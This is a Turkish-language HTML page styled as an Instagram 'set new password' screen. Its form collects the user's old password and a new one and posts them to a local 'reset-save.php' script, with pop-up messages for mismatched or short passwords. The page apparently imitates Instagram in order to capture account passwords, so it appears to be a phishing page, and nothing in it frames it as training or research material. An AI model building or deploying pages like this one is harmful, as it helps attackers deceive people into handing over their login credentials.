<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Yeni Şifre Belirle • Instagram</title>
  <link rel="icon" href="images/instagram-logo.png" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .reset-box {
      background-color: #fff;
      padding: 40px;
      border: 1px solid #dbdbdb;
      width: 320px;
      text-align: center;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 95%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    #popup {
      display: none;
      position: fixed;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #f44336;
      color: white;
      padding: 10px 20px;
      border-radius: 6px;
      font-size: 14px;
      z-index: 999;
    }
  </style>
</head>
<body>

<div id="popup"></div>

<div class="reset-box">
  <img src="images/instagram-logo.png" alt="Instagram" width="100">
  <h3>Yeni Şifre Belirle</h3>
  <form action="reset-save.php" method="post">
    <input type="password" name="old_password" placeholder="Eski şifre" required><br>
    <input type="password" name="new_password" placeholder="Yeni şifre" required><br>
    <input type="password" name="confirm_password" placeholder="Yeni şifre (tekrar)" required><br>
    <button type="submit">Şifreyi Güncelle</button>
  </form>
</div>

<script>
  window.addEventListener("DOMContentLoaded", function () {
    const params = new URLSearchParams(window.location.search);
    const popup = document.getElementById("popup");

    if (params.get("error") === "samepassword") {
      popup.innerText = "Eski ve yeni şifre aynı olamaz!";
    } else if (params.get("error") === "nomatch") {
      popup.innerText = "Yeni şifreler uyuşmuyor!";
    } else if (params.get("error") === "short") {
      popup.innerText = "Yeni şifre en az 8 karakter olmalıdır!";
    }

    if (popup.innerText !== "") {
      popup.style.display = "block";
      setTimeout(() => {
        popup.style.display = "none";
      }, 3000);
    }
  });
</script>

</body>
</html>
